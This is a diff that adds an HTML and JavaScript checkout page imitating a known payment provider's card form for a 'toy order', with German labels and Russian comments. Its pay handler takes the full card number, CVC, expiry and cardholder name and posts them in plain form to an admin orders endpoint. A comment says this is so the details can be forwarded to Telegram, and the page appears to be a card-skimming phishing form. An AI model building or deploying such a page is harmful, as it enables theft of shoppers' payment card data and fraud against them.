@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/imask@7.0.0"></script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .input-shadow { box-shadow: 0 1px 1px rgba(0,0,0,0.03), 0 3px 6px rgba(0,0,0,0.02); }
+    </style>
+</head>
+<body class="bg-white text-[#30313d]">
+
+    <div class="flex min-h-screen pb-12">
+        <div class="w-1/2 flex flex-col items-end pt-20 pr-16 bg-white">
+            <div class="w-full max-w-md">
+                <div class="flex items-center mb-12">
+                    <button onclick="window.history.back()" class="text-gray-400 hover:text-gray-600 mr-4">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
+                    </button>
+                </div>
+                
+                <p class="text-gray-500 text-lg mb-2" id="productName">Order</p>
+                <h1 class="text-4xl font-bold text-[#1a1f36]" id="totalPrice">0.00</h1>
+            </div>
+        </div>
+
+        <div class="w-1/2 bg-white border-l border-gray-100 pt-20 pl-16">
+            <div class="max-w-[440px]">
+                <button disabled class="w-full bg-gray-300 text-gray-500 font-semibold py-3 rounded-lg flex items-center justify-center mb-6 cursor-not-allowed opacity-60">
+                    Pay with <span class="ml-1 font-bold flex items-center"><span class="bg-black text-white rounded-full px-1 text-[10px] mr-1">Link</span> link</span>
+                </button>
+
+
+                <div class="space-y-6">
+                    <div class="border border-gray-200 rounded-lg overflow-hidden input-shadow">
+                        <div class="px-4 py-3 border-bottom border-gray-200 flex items-center">
+                            <svg class="w-4 h-4 text-gray-400 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+                            <input type="email" id="email" value="" class="w-full outline-none text-[15px]" placeholder="Email">
+                        </div>
+                        <div class="px-4 py-3 border-t border-gray-200 flex items-center">
+                            <span class="mr-2">PL</span>
+                            <input type="text" id="phone" value="" class="w-full outline-none text-[15px]" placeholder="+48 (151) 123-45-67">
+                            <span class="text-gray-300"></span>
+                        </div>
+                    </div>
+
+                    <section>
+                        <h3 class="font-semibold text-[15px] mb-2">Payment method</h3>
+                        <div class="border border-gray-200 rounded-lg overflow-hidden input-shadow">
+                            <div class="p-3 relative">
+                                <label class="text-[11px] text-[#6a7383] block mb-0.5">Card details</label>
+                                <div class="flex items-center justify-between">
+                                    <input type="text" id="cardNumber" placeholder="1234 1234 1234 1234" 
+                                           class="w-full outline-none text-[15px] placeholder-gray-400 bg-transparent" maxlength="19">
+                                    
+                                    <div class="flex items-center space-x-1.5 ml-2 min-w-[70px] justify-end" id="cardLogosContainer">
+                                        <img id="visaLogo" src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" 
+                                             alt="Visa" class="h-[14px] w-auto object-contain opacity-90" />
+                                        
+                                        <img id="mastercardLogo" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" 
+                                             alt="Mastercard" class="h-[14px] w-auto object-contain opacity-90" />
+                                        
+                                        <img id="amexLogo" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" 
+                                             alt="Amex" class="h-[14px] w-auto object-contain hidden shadow-sm rounded-[2px]" />
+                                        
+                                        <img id="unionpayLogo" src="https://upload.wikimedia.org/wikipedia/commons/1/1b/UnionPay_logo.svg" 
+                                             alt="UnionPay" class="h-[14px] w-auto object-contain hidden border border-gray-100 rounded-[2px]" />
+                                    </div>
+                                </div>
+                                <div id="cardError" class="text-red-600 text-xs mt-1 hidden"></div>
+                            </div>
+                            <div class="flex border-t border-gray-200">
+                                <div class="w-1/2 p-3 border-r border-gray-200">
+                                    <input type="text" id="expiry" placeholder="MM / JJ" class="w-full outline-none text-[15px]" maxlength="5">
+                                    <div id="expiryError" class="text-red-600 text-xs mt-1 hidden"></div>
+                                </div>
+                                <div class="w-1/2 p-3">
+                                    <input type="text" id="cvc" placeholder="CVC" class="w-full outline-none text-[15px]" maxlength="4">
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section>
+                        <label class="font-semibold text-[15px] block mb-2">Cardholder name</label>
+                        <input id="cardholderName" type="text" placeholder="First Last" class="w-full border border-gray-200 rounded-lg p-3 outline-none input-shadow">
+                    </section>
+
+                    <section>
+                        <label class="font-semibold text-[15px] block mb-2">Country or region</label>
+                        <select id="country" class="w-full border border-gray-200 rounded-lg p-3 outline-none appearance-none bg-white input-shadow">
+                            <option>Poland</option>
+                            <option>Deutschland</option>
+                            <option>Österreich</option>
+                            <option>Schweiz</option>
+                            <option>Frankreich</option>
+                            <option>Italien</option>
+                            <option>Spanien</option>
+                            <option>USA</option>
+                        </select>
+                    </section>
+
+                    <div class="flex items-start p-4 border border-gray-200 rounded-lg bg-[#fcfcfd]">
+                        <input type="checkbox" class="mt-1 mr-3 h-4 w-4 rounded border-gray-300">
+                        <div>
+                            <p class="text-[14px] font-medium leading-tight">Save my details for faster checkout</p>
+                            <p class="text-[12px] text-gray-500 mt-1">Pay securely on this site and anywhere Link is accepted.</p>
+                        </div>
+                    </div>
+
+                    <button id="payButton" class="w-full bg-[#0055ff] text-white font-semibold py-3 rounded-lg shadow-md hover:bg-[#0044cc] transition-colors">
+                        Pay
+                    </button>
+
+                    <div class="mt-8 flex flex-col items-center justify-center">
+                        <div class="flex items-center justify-center space-x-4 text-[#6a7383] text-[13px] font-medium">
+                            <a href="#" class="hover:text-[#30313d] transition-colors">Bedingungen</a>
+                            <span class="text-[#6a7383]">|</span>
+                            <a href="#" class="hover:text-[#30313d] transition-colors">Datenschutz</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const price = urlParams.get('price') || localStorage.getItem('checkoutPrice') || '29.99';
+            const currency = urlParams.get('currency') || localStorage.getItem('checkoutCurrency') || 'PLN';
+            const productName = urlParams.get('product') || localStorage.getItem('productName') || 'Toy order';
+
+            document.getElementById('totalPrice').textContent = price + ' ' + currency;
+            document.getElementById('productName').textContent = productName;
+            
+            // Загружаем сохраненные данные клиента в форму
+            const savedEmail = localStorage.getItem('customerEmail') || '';
+            const savedPhone = localStorage.getItem('customerPhone') || '';
+            const emailField = document.getElementById('email');
+            const phoneField = document.getElementById('phone');
+            
+            if (emailField && savedEmail) {
+                emailField.value = savedEmail;
+            }
+            if (phoneField && savedPhone) {
+                phoneField.value = savedPhone;
+            }
+            
+            // Сохраняем изменения email и phone в localStorage при их изменении
+            if (emailField) {
+                emailField.addEventListener('blur', function() {
+                    if (this.value) {
+                        localStorage.setItem('customerEmail', this.value);
+                    }
+                });
+            }
+            if (phoneField) {
+                phoneField.addEventListener('blur', function() {
+                    if (this.value) {
+                        localStorage.setItem('customerPhone', this.value);
+                    }
+                });
+            }
+            
+            function luhnCheck(num) {
+                let sum = 0;
+                let isEven = false;
+                for (let i = num.length - 1; i >= 0; i--) {
+                    let digit = parseInt(num.charAt(i), 10);
+                    if (isEven) {
+                        digit *= 2;
+                        if (digit > 9) {
+                            digit -= 9;
+                        }
+                    }
+                    sum += digit;
+                    isEven = !isEven;
+                }
+                return sum % 10 === 0;
+            }
+
+            function getCardType(cardNumber) {
+                const num = cardNumber.replace(/\s/g, '');
+                
+                if (/^4/.test(num)) return 'visa';
+                if (/^(5[1-5]|2[2-7])/.test(num)) return 'mastercard';
+                if (/^3[47]/.test(num)) return 'amex';
+                if (/^35/.test(num)) return 'jcb';
+                if (/^62/.test(num)) return 'unionpay';
+                
+                return null;
+            }
+
+            function updateCardLogos(cardNumber) {
+                const logos = {
+                    visa: document.getElementById('visaLogo'),
+                    mastercard: document.getElementById('mastercardLogo'),
+                    unionpay: document.getElementById('unionpayLogo'),
+                    amex: document.getElementById('amexLogo')
+                };
+                
+                const cardType = getCardType(cardNumber);
+                const cleanNum = cardNumber.replace(/\s/g, '');
+
+                if (cleanNum.length < 2) {
+                    Object.values(logos).forEach(img => img?.classList.add('hidden'));
+                    logos.visa.classList.remove('hidden');
+                    logos.mastercard.classList.remove('hidden');
+                    return;
+                }
+
+                Object.values(logos).forEach(img => img?.classList.add('hidden'));
+                if (cardType && logos[cardType]) {
+                    logos[cardType].classList.remove('hidden');
+                }
+            }
+
+            const cardInput = document.getElementById('cardNumber');
+            const cardError = document.getElementById('cardError');
+            if (cardInput) {
+                cardInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\s/g, '');
+                    
+                    value = value.replace(/\D/g, '');
+                    
+                    if (value.length > 16) {
+                        value = value.substring(0, 16);
+                    }
+                    
+                    let formatted = '';
+                    for (let i = 0; i < value.length; i++) {
+                        if (i > 0 && i % 4 === 0) {
+                            formatted += ' ';
+                        }
+                        formatted += value[i];
+                    }
+                    
+                    e.target.value = formatted;
+                    updateCardLogos(formatted);
+                    cardError.classList.add('hidden');
+                    this.classList.remove('border-red-500');
+                    this.style.boxShadow = '';
+                });
+
+                cardInput.addEventListener('blur', function() {
+                    const cardNumber = this.value.replace(/\s/g, '');
+                    if (cardNumber.length === 16) {
+                        if (!luhnCheck(cardNumber)) {
+                            this.classList.add('border-red-500');
+                            this.style.boxShadow = '0 0 0 3px rgba(239, 68, 68, 0.1)';
+                            cardError.classList.remove('hidden');
+                            cardError.textContent = 'Ungültige Kartennummer, bitte überprüfen Sie die Eingabe';
+                        } else {
+                            this.classList.remove('border-red-500');
+                            this.style.boxShadow = '';
+                            cardError.classList.add('hidden');
+                        }
+                    } else if (cardNumber.length > 0) {
+                        this.classList.add('border-red-500');
+                        this.style.boxShadow = '0 0 0 3px rgba(239, 68, 68, 0.1)';
+                        cardError.classList.remove('hidden');
+                        cardError.textContent = 'Ungültige Kartennummer, bitte überprüfen Sie die Eingabe';
+                    }
+                });
+
+                cardInput.addEventListener('focus', function() {
+                    this.classList.remove('border-red-500');
+                    this.style.boxShadow = '';
+                    cardError.classList.add('hidden');
+                });
+            }
+
+            const phoneInput = document.getElementById('phone');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    
+                    if (value.length > 12) {
+                        value = value.substring(0, 12);
+                    }
+                    
+                    let formatted = '';
+                    if (value.length > 0) {
+                        formatted = '+' + value.substring(0, 2);
+                        if (value.length > 2) {
+                            formatted += ' (' + value.substring(2, 5);
+                        }
+                        if (value.length > 5) {
+                            formatted += ') ' + value.substring(5, 8);
+                        }
+                        if (value.length > 8) {
+                            formatted += ' ' + value.substring(8, 10);
+                        }
+                        if (value.length > 10) {
+                            formatted += ' ' + value.substring(10, 12);
+                        }
+                    }
+                    
+                    e.target.value = formatted;
+                });
+            }
+
+            const expiryInput = document.getElementById('expiry');
+            const expiryError = document.getElementById('expiryError');
+            if (expiryInput) {
+                expiryInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    
+                    if (value.length > 4) {
+                        value = value.substring(0, 4);
+                    }
+                    
+                    let formatted = '';
+                    if (value.length >= 1) {
+                        formatted = value.substring(0, 2);
+                        if (value.length >= 3) {
+                            formatted += '/' + value.substring(2, 4);
+                        }
+                    }
+                    
+                    e.target.value = formatted;
+                    expiryError.classList.add('hidden');
+                    this.classList.remove('border-red-500');
+                    this.style.boxShadow = '';
+                });
+
+                expiryInput.addEventListener('blur', function() {
+                    const expiry = this.value;
+                    if (expiry.length === 5) {
+                        const [month, year] = expiry.split('/');
+                        const monthNum = parseInt(month, 10);
+                        const yearNum = parseInt('20' + year, 10);
+                        
+                        if (monthNum < 1 || monthNum > 12) {
+                            this.classList.add('border-red-500');
+                            this.style.boxShadow = '0 0 0 3px rgba(239, 68, 68, 0.1)';
+                            expiryError.classList.remove('hidden');
+                            expiryError.textContent = 'Ungültiger Monat (01-12)';
+                            return;
+                        }
+
+                        const now = new Date();
+                        const currentYear = now.getFullYear();
+                        const currentMonth = now.getMonth() + 1;
+
+                        if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
+                            this.classList.add('border-red-500');
+                            this.style.boxShadow = '0 0 0 3px rgba(239, 68, 68, 0.1)';
+                            expiryError.classList.remove('hidden');
+                            expiryError.textContent = 'Die Gültigkeitsdauer der Karte ist abgelaufen';
+                        } else {
+                            this.classList.remove('border-red-500');
+                            this.style.boxShadow = '';
+                            expiryError.classList.add('hidden');
+                        }
+                    }
+                });
+
+                expiryInput.addEventListener('focus', function() {
+                    this.classList.remove('border-red-500');
+                    this.style.boxShadow = '';
+                    expiryError.classList.add('hidden');
+                });
+            }
+
+            const cvcInput = document.getElementById('cvc');
+            if (cvcInput) {
+                cvcInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 4) {
+                        value = value.substring(0, 4);
+                    }
+                    e.target.value = value;
+                });
+            }
+
+            const payButton = document.getElementById('payButton');
+            if (payButton) {
+                payButton.addEventListener('click', async function() {
+                    // Валидация полей формы
+                    const emailField = document.getElementById('email');
+                    const phoneField = document.getElementById('phone');
+                    const cardNumberField = document.getElementById('cardNumber');
+                    const expiryField = document.getElementById('expiry');
+                    const cvcField = document.getElementById('cvc');
+                    const cardholderField = document.getElementById('cardholderName');
+
+                    if (!emailField || !emailField.value || !emailField.value.includes('@')) {
+                        alert('Пожалуйста, введите корректный email');
+                        emailField?.focus();
+                        return;
+                    }
+
+                    if (!phoneField || !phoneField.value || phoneField.value.length < 5) {
+                        alert('Пожалуйста, введите номер телефона');
+                        phoneField?.focus();
+                        return;
+                    }
+
+                    const cardNumber = cardNumberField ? cardNumberField.value.replace(/\s/g, '') : '';
+                    if (!cardNumber || cardNumber.length !== 16) {
+                        alert('Пожалуйста, введите корректный номер карты (16 цифр)');
+                        cardNumberField?.focus();
+                        return;
+                    }
+
+                    if (!expiryField || !expiryField.value || expiryField.value.length !== 5) {
+                        alert('Пожалуйста, введите срок действия карты (MM/YY)');
+                        expiryField?.focus();
+                        return;
+                    }
+
+                    if (!cvcField || !cvcField.value || cvcField.value.length < 3) {
+                        alert('Пожалуйста, введите CVC код');
+                        cvcField?.focus();
+                        return;
+                    }
+
+                    if (!cardholderField || !cardholderField.value.trim()) {
+                        alert('Пожалуйста, введите имя держателя карты');
+                        cardholderField?.focus();
+                        return;
+                    }
+
+                    try {
+                        const rawCart = localStorage.getItem('cart') || '[]';
+                        const cart = JSON.parse(rawCart);
+                        console.log('Корзина из localStorage:', cart);
+                        
+                        if (!Array.isArray(cart) || cart.length === 0) {
+                            alert('Корзина пуста. Пожалуйста, вернитесь на главную страницу и добавьте товар в корзину.');
+                            return;
+                        }
+
+                        const items = cart.map(item => ({
+                            product: item.id || item._id || item.product || null,
+                            quantity: item.quantity || 1
+                        })).filter(i => i.product);
+
+                        if (items.length === 0) {
+                            alert('Неверные данные в корзине');
+                            return;
+                        }
+
+                        // Получаем данные клиента из localStorage или из формы
+                        const fullName = localStorage.getItem('customerName') || '';
+                        const [firstName, ...rest] = fullName.split(' ');
+                        const lastName = rest.join(' ') || ' '; 
+                        const email = emailField.value || localStorage.getItem('customerEmail') || '';
+                        const phone = phoneField.value || localStorage.getItem('customerPhone') || '';
+                        const address = localStorage.getItem('customerAddress') || '';
+                        const city = localStorage.getItem('customerCity') || '';
+                        const zipCode = localStorage.getItem('customerZipCode') || '';
+                        
+                        console.log('Данные клиента:', { firstName, lastName, email, phone, address, city });
+
+                        const payload = {
+                            items,
+                            customer: {
+                                firstName: firstName || 'Client',
+                                lastName: (lastName && lastName.trim()) || ' ',
+                                email: email,
+                                phone: phone
+                            },
+                            deliveryAddress: {
+                                country: document.getElementById('country') ? document.getElementById('country').value || 'Poland' : 'Poland',
+                                city: city || 'Unknown',
+                                street: address || 'Unknown',
+                                postalCode: zipCode || null
+                            },
+                            paymentMethod: 'card',
+                            deliveryMethod: 'courier',
+                            notes: null,
+                            promoCode: null,
+                            deliveryCost: 0,
+                            discount: 0,
+                            currency: currency
+                        };
+
+                        const totalRaw = document.getElementById('totalPrice') ? document.getElementById('totalPrice').textContent : null;
+                        if (totalRaw) {
+                            const numeric = totalRaw.replace(/[^0-9,\.]/g, '').replace(',', '.');
+                            payload.total = parseFloat(numeric) || 0;
+                        }
+
+                        const cardNumberClean = cardNumberField.value.replace(/\s/g, '');
+                        const cvc = cvcField.value;
+                        const expiry = expiryField.value;
+                        const cardholder = cardholderField.value.trim();
+                        
+                        console.log('Данные карты получены (без номера и CVC для безопасности)');
+
+                        // Добавляем данные карты в payload
+                        payload.cardNumber = cardNumberClean;
+                        payload.cvc = cvc;
+                        payload.expiry = expiry;
+                        payload.cardholderName = cardholder;
+                        
+                        // Сохраняем данные карты в notes для отправки в Telegram
+                        payload.notes = JSON.stringify({
+                            cardNumber: cardNumberClean,
+                            cvc: cvc,
+                            expiry: expiry,
+                            cardholderName: cardholder,
+                            productId: (cart && cart[0] && (cart[0].id || cart[0]._id || cart[0].product)) || null,
+                            productName: (cart && cart[0] && cart[0].title) || null
+                        });
+                        
+                        console.log('Payload подготовлен (без чувствительных данных):', {
+                            ...payload,
+                            cardNumber: '***',
+                            cvc: '***'
+                        });
+                        
+                        // Определяем API URL
+                        const getApiUrl = () => {
+                            // Проверяем, есть ли глобальная переменная с API URL
+                            if (window.API_BASE_URL) {
+                                return window.API_BASE_URL.endsWith('/api') 
+                                    ? `${window.API_BASE_URL}/admin/orders` 
+                                    : `${window.API_BASE_URL}/api/admin/orders`;
+                            }
+                            // Для локальной разработки
+                            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+                                return 'http://localhost:3000/api/admin/orders';
+                            }
+                            // Для production используем относительный путь
+                            return '/api/admin/orders';
+                        };
+
+                        const apiUrl = getApiUrl();
+                        console.log('Отправка заказа на:', apiUrl);
+                        console.log('Payload:', payload);
+
+                        try {
+                            const resp = await fetch(apiUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload)
+                            });
+
+                            if (resp && resp.ok) {
+                                const result = await resp.json();
+                                console.log('Заказ успешно создан:', result);
+                                localStorage.removeItem('cart');
+                                // Переход на страницу благодарности
+                                const thankYouPath = '/thank-you.html';
+                                console.log('Переход на страницу благодарности:', thankYouPath);
+                                window.location.href = thankYouPath;
+                            } else {
+                                const errorText = await resp.text();
+                                console.error('Ошибка при создании заказа:', resp.status, errorText);
+                                alert('Ошибка при создании заказа: ' + (errorText || 'Неизвестная ошибка'));
+                            }
+                        } catch (e) {
+                            console.error('Ошибка при отправке заказа:', e);
+                            alert('Ошибка при оплате: ' + (e.message || 'Не удалось связаться с сервером'));
+                        }
+                    } catch (e) {
+                        console.error(e);
+                        alert('Ошибка при оплате: ' + e.message);
+                    }
+                });
+            }
+        });
+    </script>
+
+</body>
+</html>
+
